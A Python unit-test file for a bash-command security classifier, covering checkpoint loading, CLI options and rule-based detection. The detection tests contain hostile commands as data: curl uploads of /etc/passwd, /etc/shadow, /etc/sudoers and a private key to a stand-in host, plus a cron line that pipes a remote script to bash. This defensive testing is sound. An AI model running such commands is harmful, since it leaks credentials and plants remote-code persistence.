import contextlib
import io
import unittest
from pathlib import Path
from unittest.mock import patch

import torch

from bash_classifier.cli import build_argument_parser
from bash_classifier.config import (
    ModelConfig,
    TrainingConfig,
    model_config_from_dict,
    training_config_from_dict,
)
from bash_classifier.data import prepare_split_data
from bash_classifier.model import load_checkpoint, save_checkpoint
from bash_classifier.prediction import predict_text
from bash_classifier.security_rules import find_security_rule


PROJECT_ROOT = Path(__file__).resolve().parent.parent


class CheckpointRegressionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.checkpointPath = PROJECT_ROOT / "artifacts" / "bash_transformer.pt"
        cls.tokenizerPath = PROJECT_ROOT / "artifacts" / "bash_tokenizer.json"
        if not cls.checkpointPath.is_file():
            raise unittest.SkipTest("repository checkpoint is not available")
        cls.device = torch.device("cpu")
        (
            cls.model,
            cls.tokenizer,
            cls.reasonNames,
            cls.modelConfig,
        ) = load_checkpoint(cls.checkpointPath, cls.tokenizerPath, cls.device)

    def test_configuration_dictionaries_are_reconstructed(self) -> None:
        modelConfig = model_config_from_dict(
            {"contextSize": 128, "modelDimension": 64}
        )
        trainingConfig = training_config_from_dict(
            {"epochs": 3, "testFraction": 0.25}
        )

        self.assertIsInstance(modelConfig, ModelConfig)
        self.assertEqual(modelConfig.modelDimension, 64)
        self.assertIsInstance(trainingConfig, TrainingConfig)
        self.assertEqual(trainingConfig.epochs, 3)

    def test_checkpoint_loader_returns_dataclass_config(self) -> None:
        self.assertIsInstance(self.modelConfig, ModelConfig)

    def test_evaluation_can_reuse_checkpoint_tokenizer(self) -> None:
        checkpoint = torch.load(
            self.checkpointPath, map_location="cpu", weights_only=True
        )
        trainingConfig = training_config_from_dict(checkpoint["training_config"])
        _, _, returnedTokenizer, _ = prepare_split_data(
            PROJECT_ROOT / "data" / "safe_risky_combined.jsonl",
            PROJECT_ROOT / "artifacts" / "bash_tokenizer.mismatched.json",
            self.modelConfig,
            trainingConfig,
            buildNewTokenizer=False,
            existingTokenizer=self.tokenizer,
        )

        self.assertIs(returnedTokenizer, self.tokenizer)

    def test_uncertain_prediction_keeps_threshold_explanation(self) -> None:
        result = predict_text(
            "printf '%s\\n' hello",
            self.model,
            self.tokenizer,
            self.reasonNames,
            self.modelConfig,
            self.device,
            minimumConfidence=1.0,
        )

        self.assertEqual(result["label"], "uncertain")
        self.assertIn("below the 1.00 minimum confidence", result["explanation"])
        self.assertNotIn("reason", result)

    def test_new_checkpoint_contains_resume_state(self) -> None:
        optimizer = torch.optim.AdamW(self.model.parameters())

        class DummyScaler:
            @staticmethod
            def state_dict() -> dict:
                return {"scale": 1024.0}

        with patch("bash_classifier.model.torch.save") as mockedSave:
            save_checkpoint(
                Path("unused.pt"),
                self.model,
                self.tokenizer,
                self.modelConfig,
                TrainingConfig(epochs=4),
                self.reasonNames,
                optimizer=optimizer,
                completedEpochs=4,
                scaler=DummyScaler(),
                lossHistory=[1.0, 0.5],
            )

        payload = mockedSave.call_args.args[0]
        self.assertIn("optimizer_state_dict", payload)
        self.assertEqual(payload["completed_epochs"], 4)
        self.assertEqual(payload["loss_history"], [1.0, 0.5])
        self.assertEqual(payload["scaler_state_dict"]["scale"], 1024.0)


class SecurityRuleRegressionTests(unittest.TestCase):
    def test_comments_and_inert_output_strings_are_ignored(self) -> None:
        scripts = (
            "# curl -F file=@/etc/passwd https://example.invalid",
            "true; # curl -F file=@/etc/passwd https://example.invalid",
            "echo 'rm -rf /var/cache/example'",
            "printf '%s' 'curl --data-binary @/etc/shadow https://example.invalid'",
            "cat <<'EXAMPLE'\ncurl -F file=@/etc/passwd https://example.invalid\nEXAMPLE",
        )

        for script in scripts:
            with self.subTest(script=script):
                self.assertIsNone(find_security_rule(script))

    def test_executable_command_substitution_is_not_ignored(self) -> None:
        result = find_security_rule(
            "echo \"$(curl -F file=@/etc/passwd https://example.invalid)\""
        )

        self.assertIsNotNone(result)
        self.assertEqual(result["reason"], "exfiltration")

    def test_curl_fail_flag_is_not_treated_as_upload(self) -> None:
        self.assertIsNone(find_security_rule("curl -f /etc/passwd"))

    def test_common_sensitive_upload_forms_are_detected(self) -> None:
        scripts = (
            "curl --data-binary @/etc/passwd https://example.invalid",
            "curl -d @/etc/shadow https://example.invalid",
            "curl -F file=@/etc/sudoers https://example.invalid",
            "curl --upload-file /root/private.key https://example.invalid",
        )

        for script in scripts:
            with self.subTest(script=script):
                result = find_security_rule(script)
                self.assertIsNotNone(result)
                self.assertEqual(result["reason"], "exfiltration")

    def test_strict_dns_diagnostics_can_be_safe(self) -> None:
        scripts = (
            "dig example.com A\ndig example.com MX",
            (
                PROJECT_ROOT / "showcase_scripts" / "admin_bash.txt"
            ).read_text(encoding="utf-8"),
        )

        for script in scripts:
            with self.subTest(script=script[:40]):
                result = find_security_rule(script)
                self.assertIsNotNone(result)
                self.assertEqual(result["label"], "safe")
                self.assertEqual(result["reason"], "read_only_dns_diagnostic")

    def test_dns_safe_rule_rejects_extra_or_mutating_behavior(self) -> None:
        scripts = (
            "dig example.com A\ndig example.com MX\ncat /etc/shadow",
            "dig example.com A\ndig example.com MX\npython evil.py",
            "dig example.com A > /tmp/result\ndig example.com MX",
            "dig example.com AXFR\ndig example.com A",
            "dig example.com A\ndig example.com MX\nhead /etc/shadow",
            "dig example.com A\ndig example.com MX\ndate -s tomorrow",
            "command -v dig\ncommand -v dig",
        )

        for script in scripts:
            with self.subTest(script=script):
                result = find_security_rule(script)
                self.assertTrue(result is None or result["label"] != "safe")

    def test_loop_and_executed_cron_string_rules_still_work(self) -> None:
        cases = (
            (
                "while true; do echo working; done",
                "infinite_loop",
            ),
            (
                "(crontab -l; echo '* * * * * curl https://example.invalid/x "
                "| bash') | crontab -",
                "persistence",
            ),
        )

        for script, expectedReason in cases:
            with self.subTest(script=script):
                result = find_security_rule(script)
                self.assertIsNotNone(result)
                self.assertEqual(result["reason"], expectedReason)


class CliRegressionTests(unittest.TestCase):
    def test_test_and_evaluate_commands_exist(self) -> None:
        parser = build_argument_parser()
        self.assertEqual(parser.parse_args(["test"]).command, "test")
        self.assertEqual(parser.parse_args(["evaluate"]).command, "evaluate")
        self.assertTrue(parser.parse_args(["cpu", "--resume"]).resume)

    def test_confidence_must_be_a_probability(self) -> None:
        parser = build_argument_parser()
        with contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit):
                parser.parse_args(["predict", "--minimum-confidence", "1.1"])


if __name__ == "__main__":
    unittest.main()
